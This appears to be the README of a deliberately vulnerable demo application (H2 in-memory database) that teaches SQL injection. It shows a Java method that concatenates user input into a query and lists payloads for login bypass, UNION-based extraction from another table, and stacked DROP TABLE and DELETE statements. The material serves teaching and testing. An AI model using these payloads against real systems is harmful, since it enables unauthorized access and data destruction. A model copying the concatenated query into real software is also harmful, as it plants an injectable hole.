###SQL injection for non-parameterized query

SETUP:
* database: H2
* type: inmemory
* hibernate ddl:  create-drop
* data: inserted on app start


### Checking possible SQLi in API 

Checking for SQL Injections with a single quote ‘ is quite a trustworthy way to check if this attack is possible or not.

If the single quote does not return any inappropriate results, then we can try to enter double quotes and check the results.

### Login Scenario SQLi Cases

    SELECT * FROM Users WHERE User_Name = ‘" + strUserName + "‘ AND Password = ‘" + strPassword + “’;”

For simple payload username as 'John' and password as 'Smith'
query build would be as 
   
    SELECT * FROM Users WHERE User_Name = 'John' AND Password = 'Smith’;
    
For username if payload is  =>   John '-- , query would be  
    
    SELECT * FROM Users WHERE User_Name = 'John'-- AND Password = 'Smith’;

For username payload =>  John ' or 'x' = 'x     and for password as  =>   Smith ' or 'x'='x 

    SELECT * FROM Users WHERE User_Name = 'John' or 'x'='x' AND Password = 'Smith’ or ‘x’=’x’;

For username payload =>  John ' or '1'='1     and for password as  =>   Smith ' or '1'='1
    
    SELECT * FROM Users WHERE User_Name = 'John' or '1'='1' AND Password = 'Smith’ or ‘1’=’1’;

Deleting data from other table, payload could be 

    SELECT * FROM Users WHERE User_Name = ‘John’; DROP table users_details;’ –‘ AND Password = 'Smith';


### For Employee Api SQLi Scenario

API Path: localhost:8080/api/employee/byPost

Query Method and String:

    public List<Map<String, Object>> listEmployeeByPost(String post) {
        String query = "SELECT id, name, post, salary FROM employee WHERE post = '" + post + "'" ;
        log.info("QUERY : " + query);
        return jdbcTemplate.queryForList(query, new HashMap<>());
    }

Simple JSON Payload:

    {
        "post" : "Manager"
    }

Simple UNION payload 

    {
        "post" : "Manager' union select '1', '2', '3', '4"
    }

Retrieving all data from other tables

    {
        "post" : "Manager' UNION ALL SELECT id as id, name as name, price as post, created_by as salary FROM product WHERE '1' = '1"
    }

Deleting Data from table

    {
        "post" : "Manager'; DELETE FROM product WHERE '1' = '1"
    }


